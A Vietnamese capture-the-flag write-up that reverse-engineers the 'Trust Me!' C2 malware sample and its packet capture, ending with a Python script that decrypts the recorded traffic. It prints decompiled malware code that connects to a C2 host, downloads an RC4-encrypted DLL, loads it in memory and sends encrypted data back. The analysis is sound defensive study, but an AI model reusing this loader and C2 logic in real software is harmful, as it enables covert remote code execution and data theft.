---
title: Trust Me! (ASCIS2024)
published: 2025-10-21
description: ''
image: ''
tags: ['Malware']
category: 'Network Analysis, Reverse Engineering, Malware Analysis'
draft: false 

---


# Trust Me! (ASCIS2024)
>author: kAiZ3n
 
 
Nhận được 2 file : TrustMe.exe và record.pcapng
Do đây là challenge liên quan đến command&control
tôi check string thì thấy được ipaddr lạ trong file PE tiến hành xref tới hàm xử lý
## Code logic chính tại sub_88301
tại đây có 1 hàm xử lý tôi đã rename lại resolve_APIhashing_ws2_32() tại hàm này ta thấy nó gọi hàm sub_881B80 với file dll library và chuỗi hex đây là kỹ thuật resolve hashing
## Load Library Manual tại sub_881B80
- Load DLL với LoadLibraryA
- ImageDirectoryEntryToData : lấy con trỏ tới Export Table
- hàm hashing tại sub_881690
## Hashing API
```
unsigned int __fastcall sub_881690(_BYTE *a1, const char *a2)
{
  char v2; // al
  unsigned int v3; // ebx
  unsigned int v4; // esi
  const char *v5; // edi
  unsigned __int64 v6; // kr00_8
  unsigned int v7; // ebx
  unsigned __int64 v8; // rt0
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // rax
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // rax
  int i; // ebx
  unsigned int result; // eax
  unsigned __int64 v26; // [esp-10h] [ebp-A0h]
  __int64 k; // [esp-10h] [ebp-A0h]
  unsigned int v28; // [esp+10h] [ebp-80h]
  unsigned int v29; // [esp+14h] [ebp-7Ch]
  unsigned int v30; // [esp+18h] [ebp-78h]
  unsigned int v31; // [esp+1Ch] [ebp-74h]
  unsigned int v32; // [esp+20h] [ebp-70h]
  unsigned int v33; // [esp+24h] [ebp-6Ch]
  unsigned int v34; // [esp+28h] [ebp-68h]
  unsigned int v35; // [esp+2Ch] [ebp-64h]
  unsigned int v36; // [esp+30h] [ebp-60h]
  unsigned int v37; // [esp+34h] [ebp-5Ch]
  _BYTE *v38; // [esp+40h] [ebp-50h]
  unsigned int v39; // [esp+44h] [ebp-4Ch]
  char v41[20]; // [esp+4Ch] [ebp-44h] BYREF
  _QWORD v42[6]; // [esp+60h] [ebp-30h]

  v2 = *a1;
  v38 = a1;
  v30 = 0x84222325;
  v31 = 0x842224D8;
  v33 = 0x8422268B;
  v32 = 0xCBF29EE4;
  v35 = 0x8422283E;
  v34 = 0xCBF29FE4;
  v37 = 0x842229F1;
  v36 = 0xCBF2A0E4;
  v3 = 0xCBF29DE4;
  v29 = 0xCBF29DE4;
  v4 = 0xCBF29CE4;
  v5 = a2;
  v6 = 0xCBF2A1E484222BA4uLL;
  if ( *a1 )
  {
    do
    {
      v7 = v2;
      v28 = (unsigned __int64)v2 >> 32;
      HIDWORD(v8) = v4 ^ v28;
      LODWORD(v8) = v30 ^ v2;
      HIDWORD(v26) = v8 >> 25;
      LODWORD(v26) = ((_DWORD)v8 << 7) | ((v4 ^ v28) >> 25);
      v9 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v9, HIDWORD(v9)) >> 5;
      LODWORD(v26) = v9 >> 5;
      v10 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      v30 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v8) = v29 ^ v28;
      LODWORD(v8) = v31 ^ v7;
      HIDWORD(v26) = v8 >> 24;
      v39 = HIDWORD(v10);
      LODWORD(v26) = ((v31 ^ v7) << 8) | ((v29 ^ v28) >> 24);
      v11 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v11, HIDWORD(v11)) >> 6;
      LODWORD(v26) = v11 >> 6;
      v31 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v8) = v32 ^ v28;
      LODWORD(v8) = v33 ^ v7;
      v29 = (v26 % 0xFFFFFFFFFFFFFFFFuLL) >> 32;
      HIDWORD(v26) = v8 >> 23;
      LODWORD(v26) = ((v33 ^ v7) << 9) | ((v32 ^ v28) >> 23);
      v12 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v12, HIDWORD(v12)) >> 7;
      LODWORD(v26) = v12 >> 7;
      v13 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      v33 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v8) = v34 ^ v28;
      LODWORD(v8) = v35 ^ v7;
      HIDWORD(v26) = v8 >> 22;
      v32 = HIDWORD(v13);
      LODWORD(v26) = ((v35 ^ v7) << 10) | ((v34 ^ v28) >> 22);
      v14 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v14, HIDWORD(v14)) >> 8;
      LODWORD(v26) = v14 >> 8;
      v15 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      v35 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v8) = v36 ^ v28;
      LODWORD(v8) = v37 ^ v7;
      HIDWORD(v26) = v8 >> 21;
      v34 = HIDWORD(v15);
      LODWORD(v26) = ((v37 ^ v7) << 11) | ((v36 ^ v28) >> 21);
      v16 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v16, HIDWORD(v16)) >> 9;
      LODWORD(v26) = v16 >> 9;
      v36 = (v26 % 0xFFFFFFFFFFFFFFFFuLL) >> 32;
      v37 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      HIDWORD(v26) = (v6 ^ __PAIR64__(v28, v7)) >> 20;
      LODWORD(v26) = (((unsigned int)v6 ^ v7) << 12) | ((HIDWORD(v6) ^ v28) >> 20);
      v17 = 0x100000001B3LL * v26;
      HIDWORD(v26) = __SPAIR64__(v17, HIDWORD(v17)) >> 10;
      LODWORD(v26) = v17 >> 10;
      v4 = v39;
      v6 = v26 % 0xFFFFFFFFFFFFFFFFuLL;
      v2 = *++v38;
    }
    while ( *v38 );
    v5 = a2;
    v3 = v29;
  }
  HIDWORD(k) = v4;
  LODWORD(k) = v30 ^ (v4 >> 1);
  v18 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) >> 32) >> 1));
  v42[0] = v18 ^ (HIDWORD(v18) >> 1);
  HIDWORD(k) = v3;
  LODWORD(k) = v31 ^ (v3 >> 1);
  v19 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) >> 32) >> 1));
  HIDWORD(k) = v32;
  LODWORD(k) = v33 ^ (v32 >> 1);
  v42[1] = v19 ^ (HIDWORD(v19) >> 1);
  v20 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) >> 32) >> 1));
  v42[2] = v20 ^ (HIDWORD(v20) >> 1);
  HIDWORD(k) = v34;
  LODWORD(k) = v35 ^ (v34 >> 1);
  v21 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) >> 32) >> 1));
  HIDWORD(k) = v36;
  LODWORD(k) = v37 ^ (v36 >> 1);
  v42[3] = v21 ^ (HIDWORD(v21) >> 1);
  v22 = 0xC4CEB9FE1A85EC53uLL * ((0xFF51AFD7ED558CCDuLL * k) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL * k) >> 32) >> 1));
  v42[4] = v22 ^ (HIDWORD(v22) >> 1);
  v23 = 0xC4CEB9FE1A85EC53uLL
      * ((0xFF51AFD7ED558CCDuLL * (v6 ^ (HIDWORD(v6) >> 1))) ^ ((unsigned int)((0xFF51AFD7ED558CCDuLL
                                                                              * (v6 ^ (HIDWORD(v6) >> 1))) >> 32) >> 1));
  v42[5] = v23 ^ (HIDWORD(v23) >> 1);
  for ( i = 0; i < 6; ++i )
  {
    sprintf((int)v41, (int)"%016llx", v42[i]);
    result = strlen(v41) + 1;
    qmemcpy((void *)&v5[strlen(v5)], v41, result);
    v5 = a2;
  }
  return result;
}
```
![image](https://hackmd.io/_uploads/HyC4oiARJg.png)
mình đã sử dụng virustotal để nhận diện hash  là fnv nhưng có vẻ không kết thúc tại đó nó còn kết hợp thêm kỹ thuật giống như trong MurmurHash3
Do không thể giả lập lại hàm hash mà ban đầu tôi đã đề cập sau khoảng thời gian mấy ngày mò docs cũng như tìm hiểu về API ws2_32.dll thì tôi nhận ra cách mà chương trình tạo ra một socket TCP đều dùng các FunctionCall quen thuộc (như send, recv, connect, bind, accept, listen) cùng với các các parameter dễ nhận dạng do đây là một file malware C2 nghi ngờ gửi dữ liệu từ target-attacker và ngược lại nên tôi search các function tạo một TCP connect()
sau một hồi research 
https://stackoverflow.com/questions/16372700/how-to-use-getaddrinfo-to-connect-to-a-server-using-the-external-ip
thì tôi thấy trang này có một code C++ khá gần với code chúng ta và dựa vào đó tôi đã reverse lại function này
## 
```
int sub_403010()
{
  char *key; // ebx
  int v1; // eax
  _DWORD *v2; // esi
  int WSAStartUp; // eax
  PADDRINFOA *v4; // edi
  int (__stdcall *getaddrinfo)(const char *, const char *, _DWORD *, _DWORD *); // eax
  int hostAddress; // eax
  PADDRINFOA addrinfo; // eax
  int socket_return; // eax
  int v9; // ecx
  int connect_return; // eax
  int v11; // eax
  _DWORD *recv; // esi
  _DWORD *send; // eax
  int len_key; // esi
  int data; // eax
  int v16; // esi
  _DWORD *recv1; // edi
  void *v18; // edi
  int v19; // esi
  _DWORD *recv2; // ebx
  int v21; // edi
  int keyDecryptData; // eax
  int *v23; // esi
  int handle; // eax
  const char *key_random; // eax
  int v26; // eax
  void *v28; // [esp+70h] [ebp-24h]
  int lenkey; // [esp+74h] [ebp-20h]
  _BYTE *dataencRecv; // [esp+78h] [ebp-1Ch]
  unsigned int ss; // [esp+8Ch] [ebp-8h] BYREF
  unsigned int picEnc; // [esp+90h] [ebp-4h] BYREF
  int savedregs; // [esp+94h] [ebp+0h] BYREF

  malloc(8u);
  CreatePicTureBMP();
  ss = 4;
  key = (char *)malloc(0x14u);
  v28 = dword_420398;
  *(_OWORD *)key = 0LL;
  *((_DWORD *)key + 4) = 0;
  memset(v28, 0, '\x02\xCC');
  v1 = dword_4203B0(0);
  dword_4203A4(v1);
  v2 = resolve_APIhashing_ws2_32();
  WSAStartUp = ((int (__stdcall *)(int, _DWORD *))v2[114])(514, v2);
  v2[111] = WSAStartUp;
  if ( WSAStartUp )
    ExitProcess(1u);
  v2[103] = 0;
  v4 = (PADDRINFOA *)(v2 + 101);
  v2[107] = 0;
  v2[108] = 0;
  v2[109] = 0;
  v2[110] = 0;
  getaddrinfo = (int (__stdcall *)(const char *, const char *, _DWORD *, _DWORD *))v2[115];
  v2[104] = 0;
  v2[105] = 1;
  v2[106] = 6;
  hostAddress = getaddrinfo("192.168.89.136", "31337", v2 + 103, v2 + 101);
  v2[111] = hostAddress;
  if ( hostAddress )
    goto LABEL_4;
  addrinfo = *v4;
  v2[102] = *v4;
  if ( addrinfo )
  {
    while ( 1 )
    {
      socket_return = ((int (__stdcall *)(int, int, int))v2[116])(
                        addrinfo->ai_family,
                        addrinfo->ai_socktype,
                        addrinfo->ai_protocol);
      v2[100] = socket_return;
      ((void (__stdcall *)(int, int, int, _DWORD *, int))v2[117])(socket_return, 0xFFFF, 4101, v2 + 113, 4);
      v9 = v2[100];
      if ( v9 == -1 )
        break;
      connect_return = ((int (__stdcall *)(int, _DWORD, _DWORD))v2[119])(
                         v9,
                         *(_DWORD *)(v2[102] + 24),
                         *(_DWORD *)(v2[102] + 16));
      v2[111] = connect_return;
      if ( connect_return == -1 )
      {
        ((void (__stdcall *)(_DWORD))v2[120])(v2[100]);// v2[120]v2[100] == closesocket
        v11 = v2[102];
        v2[100] = -1;
        addrinfo = *(PADDRINFOA *)(v11 + 28);
        v2[102] = addrinfo;
        if ( addrinfo )
          continue;
      }
      goto LABEL_9;
    }
LABEL_4:
    ((void (*)(void))v2[118])();
    ExitProcess(1u);
  }
LABEL_9:
  freeaddrinfo(*v4);
  if ( resolve_APIhashing_ws2_32()[100] != -1 ) // resolve_APIhashing_ws2_32()[100] = connect()
  {
    recv = resolve_APIhashing_ws2_32();
    if ( !((int (__stdcall *)(_DWORD, char *, int, _DWORD))recv[122])(recv[100], key, 512, 0) )// recv[122]recv[100] ==  recv
    {
      recv[100] = 0;
      *((_BYTE *)recv + 496) = 0;
    }
    send = resolve_APIhashing_ws2_32();
    ((void (__stdcall *)(_DWORD, unsigned int *, int, _DWORD))send[121])(send[100], &ss, 1, 0);// v29 = 4 (gửi 1 byte)
    ss = strlen((const char *)create_key_random((int)&savedregs));
    RC4_sendEnc((int)&ss, 4, key);
    len_key = strlen((const char *)create_key_random((int)&savedregs));
    data = create_key_random((int)&savedregs);
    RC4_sendEnc(data, len_key, key);            // ma hoa
    v16 = nameFileDLL + 4;
    recv1 = resolve_APIhashing_ws2_32();
    if ( !((int (__stdcall *)(_DWORD, int, int, _DWORD))recv1[122])(recv1[100], v16, 4, 0) )// nhan tu 31337 -> 4 bytes 002a0000 kich thuoc file DLL
    {
      recv1[100] = 0;
      *((_BYTE *)recv1 + 496) = 0;
    }
    v18 = malloc(*(_DWORD *)(nameFileDLL + 4));
    v19 = *(_DWORD *)(nameFileDLL + 4);
    *(_DWORD *)(nameFileDLL + 8) = v18;
    recv2 = resolve_APIhashing_ws2_32();
    if ( !((int (__stdcall *)(_DWORD, void *, int, _DWORD))recv2[122])(recv2[100], v18, v19, 0) )// data file dll đã bị encrypted
    {
      recv2[100] = 0;
      *((_BYTE *)recv2 + 496) = 0;
    }
    lenkey = strlen((const char *)create_key_random((int)&savedregs));
    v21 = nameFileDLL;
    dataencRecv = *(_BYTE **)(nameFileDLL + 8);
    keyDecryptData = create_key_random((int)&savedregs);
    rc4_encrypt(*(_DWORD *)(v21 + 8), *(_DWORD *)(v21 + 4), keyDecryptData, lenkey, dataencRecv);// *(dword_4203B4+4) = key && *(dword_4203B4+8) = data
    v23 = (int *)nameFileDLL;
    handle = LoadDLL(*(_DWORD *)(v21 + 8), *(_DWORD *)(v21 + 4));
    *v23 = handle;
    if ( !handle )
      sub_401600("Can't load library from memory.\n");
    if ( !*(_DWORD *)nameFileDLL )
    {
      _loaddll((char *)0xFFFFFFFF);
      JUMPOUT(0x4033B3);
    }
    dword_420394 = CreatePicTureBMP();
    picEnc = *(_DWORD *)dword_420394 / (unsigned int)lendataEnc;
    key_random = (const char *)create_key_random((int)&savedregs);// gui size cua pic
    RC4_sendEnc((int)&picEnc, 4, key_random);
  }
  dword_42039C(1, sub_402E80);
  v26 = dword_4203B0(5);
  dword_4203A4(v26);
  return 0;
}
```
Giai đoạn phân tích đi đến được đây coi như cũng dễ thở hơn chút vì để rename cũng như handle hết hàm này cũng mất khá nhiều thời gian

đầu tiên sẽ khởi tạo WSASTARTUP và getaddrinfo để lấy thông tin External IP
nếu getaddrinfo thất bại chương trình sẽ return về **nonzero hay còn gọi là error code** sẽ đi tới LABEL_4
và dùng ExitProcess() để terminal chương trình.
nếu getaddrinfo thành công return 0
![image](https://hackmd.io/_uploads/SySXdWHA1g.png)
và trả về các object của struct attackInfo
tiếp theo chương trình sẽ tạo một socket với attackrinfo tại v2[116]
![image](https://hackmd.io/_uploads/SyJlcWr01x.png)


Nếu socket tạo thành công sẽ gọi functionName connect() từ ws2_32.dll đã resolved APIhash với v2[119]
và v2[120] có thể là closeconnect()
khi tạo thành công connect() chương trình đi tới LABLE_9 bắt đầu nhận và gửi payload thông qua socket này

## tại LABEL_9
nhận diện các functioncall thông qua các parameter thông dụng
![image](https://hackmd.io/_uploads/BJGpkGS0Je.png)

đầu tiên tại target nhận một key với buffer 512 từ attacker
filter wireshark : ip.addr==192.168.89.136 and tcp.srcport==31337
![image](https://hackmd.io/_uploads/ByWh3ZSRJe.png)
**key nhận từ attacker : "I'm_4_Gat3_K33per"**
target sẽ gửi lại cho attacker 1 byte payload = 4 (do tại bước này mình vẫn chưa hiểu attacker send 1 bytes này làm gì nên mình sẽ giải thích ở dưới sau nếu các bạn thắc mắc hãy kéo xuống dưới)
```
send = resolve_APIhashing_ws2_32();
((void (__stdcall *)(_DWORD, unsigned int *, int, _DWORD))send[121])(send[100], &ss, 1, 0);// v29 = 4 (gửi 1 byte)
```

theo dõi bên wireshark
filter wireshark : ip.addr==192.168.89.136 and tcp.dstport==31337
![image](https://hackmd.io/_uploads/HJWF3ZBRJg.png)


tiếp theo chương trình sử dụng hàm create_key_random((int) &savedregs)) với để tạo khóa
## Create_key_random
```
int __usercall create_string@<eax>(int a1@<ebp>)
{
  int result; // eax
  unsigned int v2; // eax
  _BYTE *v3; // edi
  unsigned int i; // esi
  char v5[64]; // [esp-40h] [ebp-4Ch] BYREF
  int v6; // [esp+0h] [ebp-Ch]
  void *v7; // [esp+4h] [ebp-8h]
  void *retaddr; // [esp+Ch] [ebp+0h]

  v6 = a1;
  v7 = retaddr;
  result = dword_420360;
  if ( !dword_420360 )
  {
    v2 = time(0);
    srand(v2);
    strcpy(v5, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
    v3 = malloc(0x40u);
    for ( i = 0; i < 0x40; ++i )
      v3[i] = v5[rand() % 52];
    v3[64] = 0;
    result = (int)v3;
    dword_420360 = (int)v3;
  }
  return result;
}
```
hàm sẽ tạo khóa 64 bytes từ random char bằng cách lấy time hiện tại
và nó sẽ mã hóa key này với key mà attacker đã gửi đầu tiên và send độ dài key đã bị mã thông qua hàm RC4_send
## chức năng hàm RC4_send()
```
void __fastcall RC4_sendEnc(int data, int lenkey, const char *key)
{
  size_t v4; // esi
  _BYTE *enc; // ebx
  _DWORD *send; // eax

  v4 = lenkey + 1;
  enc = malloc(lenkey + 1);
  memset(enc, 0, v4);
  if ( resolve_APIhashing_ws2_32()[100] != -1 )
  {
    rc4_encrypt(data, lenkey, (int)key, strlen(key), enc);
    send = resolve_APIhashing_ws2_32();
    ((void (__stdcall *)(_DWORD, _BYTE *, int, _DWORD))send[121])(send[100], enc, lenkey, 0);
    Sleep(30u);
  }
}
```
nó sẽ dùng rc4 để encrypt và sử dụng resolve_APIhashing_ws2_32() để lấy functionName : send() từ ws2_32.dll chức năng của hàm resolve_APIhashing_ws2_32 mình đã đề cập ở trên
đây là payload đã send 4bytes len của key và ngay sau đó là key
ban đầu tại đây mình nghĩ sẽ tạo ra 2 packet trên file pcapng và mình kh thấy packet nào hợp lệ sau khoảng thời gian mình nhận ra nó đã đc gửi cùng với nhau trong 1 packet và đây là payload của nó 
![image](https://hackmd.io/_uploads/BJ3oeGBCyl.png)
vì đây là packet t2 sau khi send 0x04 
payload có 68bytes : chia ra 2 phần 
```
encrypted-key-length :86dad7bb 
encrypted-key : 918e87d161556ad2e40a89010adfe3aa41ca44764e786b738047456cc80d021e7f60b56776b858225d45099f0e99b62f5758977fde740bcc2be36dbf403eb860
```
đã có đầy đủ thông tin về key và tiến hành xử lý decrypt RC4
```
sizekey = 0x40 = 64bytes đúng với logic tạo key
key = "WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM"
```
![image](https://hackmd.io/_uploads/HJyeQzSRJe.png)

có key rồi decrypt luôn payload tiếp theo đã đc gửi từ attacker tới target đầu tiên là len data tiếp theo là data và sau đó bị encrypted bởi rc4_encrypt sau đó có vẻ như nó load file này vào memory và chạy file
## Load file Drop (chức năng tinh chỉnh key)
```
    recv2 = resolve_APIhashing_ws2_32();
    if ( !((int (__stdcall *)(_DWORD, void *, int, _DWORD))recv2[122])(recv2[100], v18, v19, 0) )// data file dll đã bị encrypted
    {
      recv2[100] = 0;
      *((_BYTE *)recv2 + 496) = 0;
    }
    lenkey = strlen((const char *)create_key_random((int)&savedregs));
    v21 = fileDLLdrop;
    dataencRecv = *(_BYTE **)(fileDLLdrop + 8);
    keyDecryptData = create_key_random((int)&savedregs);
    rc4_encrypt(*(_DWORD *)(v21 + 8), *(_DWORD *)(v21 + 4), keyDecryptData, lenkey, dataencRecv);// *(dword_4203B4+4) = key && *(dword_4203B4+8) = data
    v23 = (int *)fileDLLdrop;
    handle = LoadDLL(*(_DWORD *)(v21 + 8), *(_DWORD *)(v21 + 4));
    *v23 = handle;
```

chức năng của hàm LoadDLL là load một file dll,exe vào memory như một dạng PELoader.
và return về một dạng handler 
kỹ thuật này được gọi là Virtual Machine-based PE Loader
trả về một con trỏ (pointer) đến Entry Point hoặc Base Address của PE đã được map vào bộ nhớ.
và attacker sẽ import manual các functionName của file PE này vào sử dụng

sau khi PEloader thành công attacker đã tạo một file BMP
và sau đó gửi size của file
![image](https://hackmd.io/_uploads/By4ocMrCkg.png)




do thời gian gửi payload chênh lệch rất ít nên hàm tạo khóa sẽ cho ra các khóa giống nhau
```
filter wirshark : ip.addr==192.168.89.136 and tcp.dstport==51392 and tcp.srcport==31337
với gửi len data ở gói packetid == 10
và data ở gói packetid == 11 trở đi để thuận tiện ta sẽ lấy payload ở TCP stream
```
![image](https://hackmd.io/_uploads/BJoXPGH01e.png)
download file về

## AddVectoredExceptionHandler
![image](https://hackmd.io/_uploads/H14ejMSRkl.png)

```
dword_42039C nó là một APIwindows AddVectoredExceptionHandler
một dạng bắn ExceptionCode để xử lý logic code thật
```
![image](https://hackmd.io/_uploads/rJBwXEH0yl.png)
sau khi fix
```
LONG __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  DWORD ExceptionCode; // eax
  _DWORD *v2; // eax
  _DWORD *recv; // esi
  void *v5; // edx
  PCONTEXT ContextRecord; // eax
  DWORD Eip; // ecx
  DWORD v8; // ecx
  char v9; // [esp+13h] [ebp-1h] BYREF

  if ( resolve_APIhashing_ws2_32()[100] == -1 || !*(_DWORD *)fileDLLdrop )
  {
    ExceptionInfo->ContextRecord->Eip += 5;
    return -1;
  }
  ExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
  if ( ExceptionCode == 0xC0000005 )            // exception code
  {
    v2 = (_DWORD *)dword_8A0394;
    qmemcpy(dword_8A0398, ExceptionInfo->ContextRecord, 716u);
    if ( dataPic <= (int)(*v2 / (unsigned int)lendataEnc) )
    {
      recv = resolve_APIhashing_ws2_32();
      if ( !((int (__stdcall *)(_DWORD, char *, int, _DWORD))recv[122])(recv[100], &v9, 1, 0) )
      {
        recv[100] = 0;
        *((_BYTE *)recv + 496) = 0;
      }
      switch ( v9 )                             // nhận data option tu attacker
      {                                         // cac case nay se goi ham cua file DLLdrop
        case 0:
          ExceptionInfo->ContextRecord->Eip = (DWORD)gen0;// gán địa chỉ gen0 cho EIP để thực thi tiếp tục tại địa chỉ đó
          return -1;
        case 1:
          ExceptionInfo->ContextRecord->Eip = (DWORD)gen1;
          return -1;
        case 2:
          ExceptionInfo->ContextRecord->Eip = (DWORD)gen2;
          return -1;
        case 3:
          ExceptionInfo->ContextRecord->Eip = (DWORD)gen3;
          return -1;
      }
    }
    return -1;
  }
  if ( ExceptionCode != 0x80000003 )
    return -1;
  v5 = dword_8A0398;
  if ( !*((_DWORD *)dword_8A0398 + 46) )
    return -1;
  qmemcpy(ExceptionInfo->ContextRecord, dword_8A0398, sizeof(CONTEXT));
  ContextRecord = ExceptionInfo->ContextRecord;
  Eip = ContextRecord->Eip;
  if ( lendataEnc )
    v8 = Eip - 2;
  else
    v8 = Eip + 5;
  ContextRecord->Eip = v8;
  memset(v5, 0, 716u);
  return -1;
}
```
## Solution
Trong Windows ta có thể chúng ta có thể bắt Exception và trỏ EIP tới một địa chỉ hàm mà ta mong muốn và thực thi tiếp logic code tại đó
Các EIP được gán cho địa chỉ của gen0-gen3 (các hàm này bạn có thể xem ở file drop)
Solution:
- Target sẽ nhận 1 key từ attacker
- Sau đó dùng key đó để làm key cho một key dùng để encrypt-decrypt payload và key này được tạo thông qua hàm create_random_string()
- Download một file exe/dll về máy target và dùng key(được tạo từ hàm random) để decrypting
- Load Dll vào program và sử dụng các hàm của nó (gen0-gen3) để customkey, Tạo một file bmp
- Thêm một các vectorException và gán EIP cho các hàm gen0-gen3 mỗi lần nhận option từ attacker thì target sẽ gửi lại size payload và chạy switch-case theo từng option phù hợp để tạo customkey , mã hóa và send payload cho attacker.
script solve.py
```

from scapy.all import rdpcap, Raw,IP,TCP

def rc4_decrypt(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    out = bytearray()

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        out.append(byte ^ K)

    return bytes(out)

def gen0_customKey(key: bytes) -> bytes:
    return key[::-1]

def gen1_customKey(key: bytes) -> bytes:
    s = key.decode()
    flipped = ''
    for c in s:
        if c.islower():
            flipped += c.upper()
        elif c.isupper():
            flipped += c.lower()
        else:
            flipped += c
    return flipped.encode()

def gen2_customKey(key: bytes) -> bytes:
    return key[-1:] + key[:-1]

def gen3_customKey(key: bytes) -> bytes:
    result = bytearray()
    for b in key:
        if 65 <= b <= 90:  # 'A' - 'Z'
            v = ((b - 52) % 26) + 65
        elif 97 <= b <= 122:  # 'a' - 'z'
            v = ((b - 84) % 26) + 97
        else:
            v = b
        result.append(v)
    return bytes(result)


initialKey = b"WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM"

packets = rdpcap("record.pcapng")
pic = b""
payload = b""
option = []
size = []
for packet in packets[24:]:
    if IP in packet and TCP in packet:
        src = packet[IP].src
        dst = packet[IP].dst
        if src == "192.168.89.136" and dst == "192.168.89.1":
            if Raw in packet:
                option.append(packet[Raw].load)
                if(len(option) >= 2):
                    match option[-2]:
                        case b'\x00':
                            key = gen0_customKey(initialKey)
                            pic += rc4_decrypt(key,payload)
                        case b'\x01':
                            key = gen1_customKey(initialKey)
                            pic += rc4_decrypt(key,payload)
                        case b'\x02':
                            key = gen2_customKey(initialKey)
                            pic += rc4_decrypt(key,payload)
                        case b'\x03':
                            key = gen3_customKey(initialKey)
                            pic += rc4_decrypt(key,payload)
                    
                    payload = b''
            else: continue
        elif src == "192.168.89.1" and dst == "192.168.89.136":
            if Raw in packet:
                raw_data = packet[Raw].load
                if len(raw_data) == 4:
                    if(len(option) >= 2):
                        match option[-1]:
                            case b'\x00':
                                key = gen0_customKey(initialKey)
                                size.append(rc4_decrypt(key,packet[Raw].load))
                            case b'\x01':
                                key = gen1_customKey(initialKey)
                                size.append(rc4_decrypt(key,packet[Raw].load))
                            case b'\x02':
                                key = gen2_customKey(initialKey)
                                size.append(rc4_decrypt(key,packet[Raw].load))
                            case b'\x03':
                                key = gen3_customKey(initialKey)
                                size.append(rc4_decrypt(key,packet[Raw].load))
                    
                else:
                    payload += raw_data
for i in range(len(size)):
    print(f"size payload của option {option[i]}: {size[i]}")
with open("pic.bmp", "wb") as f:
    f.write(pic)



```

![image](https://hackmd.io/_uploads/SyEdvv0Rkg.png)



PS: Cảm ơn mọi người đã đọc và cảm ơn author vì qua challenge này mình học thêm được rất nhiều thứ mới lạ.
